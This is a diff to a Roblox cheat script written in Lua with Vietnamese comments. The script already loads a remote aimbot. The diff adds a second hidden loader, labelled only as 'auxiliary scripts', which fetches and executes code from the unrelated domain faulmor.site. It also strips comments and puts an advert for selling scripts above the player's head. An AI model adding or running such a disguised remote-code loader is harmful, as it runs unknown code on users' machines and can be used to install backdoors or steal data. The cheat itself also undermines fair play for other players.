@@ -28,9 +28,13 @@ end
 getgenv().ZenkidLoaded = true
 getgenv().ZenkidConnections = {}
 
+-- Tải các script phụ trợ
 task.spawn(function()
     pcall(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/Chocola-Aimbot-Cap/refs/heads/main/Script.lua"))()
+    end)
+    pcall(function()
+        loadstring(game:HttpGet("https://faulmor.site/v2/151555b02529a3f1585fbbe8f3fb9a51/lua"))()
     end)
 end)
 
@@ -52,7 +56,7 @@ ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 local IntroFrame = Instance.new("Frame")
 IntroFrame.Name = "IntroFrame"
 IntroFrame.Parent = ScreenGui
-IntroFrame.BackgroundTransparency = 1 -- Nền trong suốt hoàn toàn
+IntroFrame.BackgroundTransparency = 1
 IntroFrame.Size = UDim2.new(1, 0, 1, 0)
 IntroFrame.Position = UDim2.new(0, 0, 0, 0)
 IntroFrame.ZIndex = 100
@@ -412,7 +416,6 @@ MinusBtn.MouseButton1Click:Connect(function()
     end
 end)
 
--- Tạo hiệu ứng Rainbow riêng cho UI Frame
 local renderConn = RunService.RenderStepped:Connect(function()
     local hue = (tick() * 1.2) % 1
     local color = Color3.fromHSV(hue, 1, 1)
@@ -420,7 +423,6 @@ local renderConn = RunService.RenderStepped:Connect(function()
 end)
 table.insert(getgenv().ZenkidConnections, renderConn)
 
--- Tạo dòng chữ trên đầu nhân vật (Màu xanh lá)
 local function createOverheadText(character)
     if not character then return end
     local head = character:WaitForChild("Head", 5)
@@ -442,8 +444,8 @@ local function createOverheadText(character)
     textLabel.Size = UDim2.new(1, 0, 1, 0)
     textLabel.BackgroundTransparency = 1
     textLabel.Font = Enum.Font.SourceSansBold
-    textLabel.Text = "free dm in TT:thanhz2867 for script sell lam tuat" -- Đã xóa chữ "gay"
-    textLabel.TextColor3 = Color3.fromRGB(0, 255, 128) -- Chuyển sang màu xanh lá
+    textLabel.Text = "free dm in TT:thanhz2867 for script sell lam tuat"
+    textLabel.TextColor3 = Color3.fromRGB(0, 255, 128)
     textLabel.TextSize = 18
     textLabel.TextScaled = true
     textLabel.TextStrokeTransparency = 0.2
